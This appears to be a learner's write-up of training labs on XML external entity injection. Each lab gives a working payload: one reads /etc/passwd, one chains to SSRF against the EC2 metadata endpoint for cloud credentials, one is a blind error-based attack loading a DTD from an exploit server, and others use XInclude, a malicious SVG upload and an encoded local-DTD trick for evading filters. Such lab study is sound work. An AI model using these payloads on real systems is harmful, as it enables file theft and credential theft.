______________

# Lab: Exploiting XXE using external entities to retrieve files

- For this exercise we will be executing a **XML external entity (XXE) injection** with the purpose of exfiltrate **/etc/passwd**

    The vulnerability in this exercise is located on the check store, let's capture the request with **Burp Suite**

<img width="710" height="418" alt="Captura de pantalla 2026-04-08 154958" src="https://github.com/user-attachments/assets/dd9290fc-96a5-4fa9-bfbf-76a1056abcc4" />

- As principal we see a **XML declaration** and behind twe find the **Elements**, we will work on this.

>An essential part of a XXE is to add a malicious **DTD (Document Type Definition)**, let's see an example

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- Knowing this we need to adapt it to our origninal request

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

     We use the wrapper file to list the /etc/passwd

<img width="1353" height="444" alt="Captura de pantalla 2026-04-08 161612" src="https://github.com/user-attachments/assets/45806d2a-f912-458c-9bec-dadbbb1f7555" />

- Is reporting us successfully the **/etc/passwd**

<img width="1196" height="279" alt="Captura de pantalla 2026-04-08 161642" src="https://github.com/user-attachments/assets/e108f05d-8094-4e0e-a04a-a96516c42be6" />

- This exercise represents a basic **XML external entity (XXE) injection**

## Gold rule

- As pentesters facing the reality it's crutial to know we can find a **XML declaration** with multuple parameters where only one can be vulnerable, we need to try one by one. In this exercise we have only two because due to educational purposes bur this does not represent the reallity 

_________________

## Exploiting XXE to perform SSRF attacks

- In this exercise we will leverage of a **misconfigured API** as vehicle using the **EC2 metadata endpoint cloud IP** `http://169.254.169.254/` to extract credentials from the **cloud** by **XXE** concatenating to **SSRF**

     leak in this exercise is located on the **check store**, let's capture the request with **burpsuite**

<img width="917" height="412" alt="Captura de pantalla 2026-04-08 235720" src="https://github.com/user-attachments/assets/fea80d3d-a4aa-427b-8944-a8d19fb1d283" />
    Typical XML structure, let's modify it

- We use **SYSTEM** to force the **XML processor** to load data from an external resource (local file or remote URL).

<img width="962" height="432" alt="Captura de pantalla 2026-04-08 235208" src="https://github.com/user-attachments/assets/02fe0e58-f19c-4488-ba8b-4a5260f21880" />

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

<img width="962" height="308" alt="Captura de pantalla 2026-04-08 235307" src="https://github.com/user-attachments/assets/0c5113f0-402b-4f63-a97e-97552bb998fe" />


- Due to we are using a **metadata endpoint IP** (Which is used to get server information) our request is taken by the API and once the cloud response as we are not requesting something specific the cloud will report what she got in that directory, in this case `latest`. Finally as our request work on the **productID** request, the response will come as **product ID** 

```
"Invalid product ID: latest"
```
     As the parameter latest it does not exist system is responding like this 

- In accordance with this information, we will continue sending requests with the **Cloud response** till get the credentials 

<img width="1238" height="433" alt="Captura de pantalla 2026-04-08 235520" src="https://github.com/user-attachments/assets/392f15ed-4630-4f3a-a8f5-290725171d9b" />

- We got the credentials, now let's reload the main page.

<img width="1231" height="251" alt="Captura de pantalla 2026-04-08 235600" src="https://github.com/user-attachments/assets/319e1323-f800-45c6-ba40-65718583d207" />

## Key point

- The attack we execute in this execirse highlight two critical points as **security measures** allowing us to concatenate from a **XXE attack** to a **SSRF**, let's dive in. Initially **API** has not an accurate configuration and sanitization, it allows add **external entitys** without any filter and second the **Cloud** is not sanitized either this one receives requests without ask for credentials, tokens or any validation, since the request come from the server it accepted which is really dangerous.

_______________

# Lab: Exploiting blind XXE to retrieve data via error messages

- In this exercise we will execute a **blind XXE** through via **error messages**, let's start.

     As the leak resides on the check store let's capture the request with **Burpsuite**

<img width="690" height="381" alt="Captura de pantalla 2026-04-09 200534 1" src="https://github.com/user-attachments/assets/223638d0-e252-4e90-adca-4047f34b398e" />
     Regular **XML** structure 

- Let's make a proof with a tipycal **DTD** requesting the **/etc/passwd**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

<img width="377" height="95" alt="Captura de pantalla 2026-04-09 201534" src="https://github.com/user-attachments/assets/775ee836-6123-4061-938e-c7aa354e2894" />

>`Entities are not allowed for security reasons` as response by the system give us a relly important clue, it shows us how not to attack.


- **Burpsuite** offer us a server to execute our attack, let's use it 

     We will add the next **DTD**

```
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```

- Here we have the key to solve this exercise, let's dive in. In this exerxise we are applying the concept of **Two entitys** which is really useful, first we declare the request of **/etc/passwd** and in the second declaration is where we **leverage of the error**, we request a file that it does not exist and after we call the first declaration, that way once the system recognize the error this will continue with our declaration and will report the **/etc/passwd**

<img width="1277" height="654" alt="Captura de pantalla 2026-04-09 194039 1" src="https://github.com/user-attachments/assets/87ed5530-a768-4eda-84ec-74dec2832d87" />

- Now we need to get the link of our **exploit-server**

<img width="867" height="163" alt="Captura de pantalla 2026-04-09 193946" src="https://github.com/user-attachments/assets/f9ab1a47-0e76-4da5-a48e-a1533c3f22c2" />

```
https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit
```

- With this done, let's add a **DTD** which will refer our **exploit-server** and will execute the two declarations.

     In this point it's important to remenber  the clue we found initially `Entities are not allowed for security reasons` . For this reason we can not call the **DTD** as **&xxe;** (**general entitys**), actually we don't need to call it, it's already iamong the **brackets** and this away this one will execute the external one (that one on the **exploit-server**). This is known as **parametric entities**
 
<img width="1851" height="458" alt="Captura de pantalla 2026-04-09 200450" src="https://github.com/user-attachments/assets/4b5e1fe4-2eda-40b1-9489-e86fa82faf76" />

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ac70085037c08f2883d015a0188003a.exploit-server.net/exploit">  %xxe;]>
```

- We receive the **/etc/passwd**, let's reload the page.

<img width="1233" height="286" alt="Captura de pantalla 2026-04-09 202320" src="https://github.com/user-attachments/assets/5ee3e71b-442a-42bf-84b1-81c937cd5908" />

- Exercise is solved successfully.

________________
# Lab: Exploiting XInclude to retrieve files

- In this exercise we are facing a modern and really used practice implemented to enforce the web'sites security. Web sites embeds the **XML** product by client-submitted data that way attacker can not modify it avoiding attacks.

     For this situations we can implement **XInclude** which basically It allows embedding an external file within an XML document. The processor sees `<xi:include>`, navigates to the path (such as `file:///etc/passwd`) and "pastes" the text into the document.

- Leak is on the **Check store** let's capture the request with **Burpsuite**

<img width="683" height="312" alt="Captura de pantalla 2026-04-09 214332" src="https://github.com/user-attachments/assets/5a59ccde-47e6-474a-a91c-5beba1282967" />

- Before we use to see the **XML structure** in the request, right now due to the security measures it's not available for us but and here is the magic key, even **if the XML is embeded** if we have access to parameters in use in the **XML structure** and this ones are not protected we can inject exploits in there.

     Exploit 

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```

[PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

<img width="1508" height="458" alt="Captura de pantalla 2026-04-09 214244" src="https://github.com/user-attachments/assets/e59e4fae-40c3-45ff-b09f-13c491bcbc06" />

- We got the /etc/passwd as response, ito worked. now let's reload the main page

<img width="1278" height="256" alt="Captura de pantalla 2026-04-09 221619 1" src="https://github.com/user-attachments/assets/48c2bfd6-d263-46a6-abe5-c4f2f6ee88ea" />


______________
# Lab: Exploiting XXE via image file upload

- In this exercise we leverage the fact some applications allow users to upload files and Images in formats like **.png .jpeg** and **.svg** in specific too which is the key of this exercise. As the composition of a **.svg** images is completely **XML** we can use to inject **malicious XML** 

<img width="748" height="755" alt="Captura de pantalla 2026-04-10 224454" src="https://github.com/user-attachments/assets/4340a3e5-080d-4f4c-b4c9-550a6619c3a7" />

- This exercise has a panel to add commentaries and uploads Images, with the purposes of this exercise let's download an **.svg image** 

<img width="655" height="594" alt="Captura de pantalla 2026-04-10 224204" src="https://github.com/user-attachments/assets/e03342f0-5eff-4fd8-bcc3-3bde9f647535" />

<img width="1440" height="131" alt="Captura de pantalla 2026-04-10 224411 1" src="https://github.com/user-attachments/assets/fdff5b56-3d0a-4c41-a66a-74508a9f6882" />

- Once we download the image, we need to change the content for the next **malicious payload**

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

    This script creates an image where will be inserted the info we are requesting, image is the blank canvas and the request is the request

     `the label <text> describe what will be print it on the image`

[PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg)

- When we post the comment, let's see the comment and something important to highlight is the image, we need to examine it 

<img width="1440" height="131" alt="Captura de pantalla 2026-04-10 224411" src="https://github.com/user-attachments/assets/df0c2d03-e482-449b-8aef-697c8a73381a" />

<img width="842" height="101" alt="Captura de pantalla 2026-04-10 224532" src="https://github.com/user-attachments/assets/e405aa11-83ee-44f3-9e85-39649628ae14" />

<img width="772" height="554" alt="Captura de pantalla 2026-04-10 224634" src="https://github.com/user-attachments/assets/1137274b-6efa-4c5c-9902-ca66a8f6a340" />

- The malicious request is requesting the `/etc/hostname` and this what the image is showing us, let's paste it on the main page 

<img width="502" height="198" alt="Captura de pantalla 2026-04-10 223819" src="https://github.com/user-attachments/assets/751f88c7-b79d-4740-ba8d-42c6a20353ef" />

- Page accepted our input, exercise solved

<img width="1278" height="256" alt="Captura de pantalla 2026-04-09 221619 1" src="https://github.com/user-attachments/assets/b288fe2a-b297-4642-8edb-b65980deda59" />

## Key point

- The danger of **SVG files** lies in their XML-based nature. The vulnerability isn't in the image itself, but in the backend processing library that resolves external entities when attempting to render the file. By embedding the contents of /etc/hostname within a `<text>` tag, we transform a simple file upload into a visual exfiltration tool, bypassing defenses that only monitor conventional data traffic

___________

# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

- In this exercise we are facing a Web-site which does not accept **Externals DTD's (only internals)** but it accepts **external entities**.

     Let's capture the **stockCheck** request with **Burpsuite** 

<img width="675" height="401" alt="Captura de pantalla 2026-04-11 191344" src="https://github.com/user-attachments/assets/03d0d2b9-b331-4bd5-9cf6-343b875f1924" />
       Regular **XML structure** 

- We leverage the system relies in **internals DTD's** as security measure in order to execute an **internal DTD** as **Trojan horse** and after execute the **main attack**, but before do that we need to test an **internal DTD**

```
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
```
     Internal DTD script

<img width="1220" height="425" alt="Captura de pantalla 2026-04-11 191217 1" src="https://github.com/user-attachments/assets/5d08f8d4-63f4-4fc8-8e8d-2616e2290b84" />

- We receive a **Status code 200** , we confirm the web site **security measure** we expected, now let's proceed to build the **main attack** 

```
<!DOCTYPE message [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
<!ENTITY % ISOamso ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; ]>
```

     <!DOCTYPE message -> we declare the DTD

      <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> -> We set-up the Trojan horse (first entity), once we send this; the system open/accepts the funtionality of DTD's (basically give us the permission to run more DTD)

     <!ENTITY % ISOamso ' -> We set-up the main attack, the ISOamso ENTITY content is describe inside the single quotes
      <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> -> request to the /etc/passwd path (it's importante remember use double quotes due to we already use sinle quotes in the main ENTITY)
      <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> -> Right here we use the ENTITY as bait to execute an error and after execute the ENTITY file (where we request the /etc/passwd). We emphasize the use of Unicode characteres to replace some of the script to avoid security filters (many security filters search for specific and specially recognized dangerous characteres)

      &#x25;  -> %
      &#x26;  -> &
      &#x27;  -> '

- Let's run the request.

<img width="1684" height="565" alt="Captura de pantalla 2026-04-11 181654 1" src="https://github.com/user-attachments/assets/a61a3ac4-ba28-4064-ad0e-36718fe6e45d" />

- It worked successfully.

<img width="1200" height="215" alt="Captura de pantalla 2026-04-11 181736" src="https://github.com/user-attachments/assets/aceb61a0-7483-4eec-995f-efcba3082450" />

## Key points

- This exercise taught us how a security policy of **no external DTDs accepted** is not enough to ensure **Malicious XML** is injected and also the fact of to know certain **internals DTD's** allow us execute **privileges actions** together with the execution of **External entites**. Another important fact regarding the **Web-site security** is recognize **Unicodes characteres** which hide dangerous characteres






















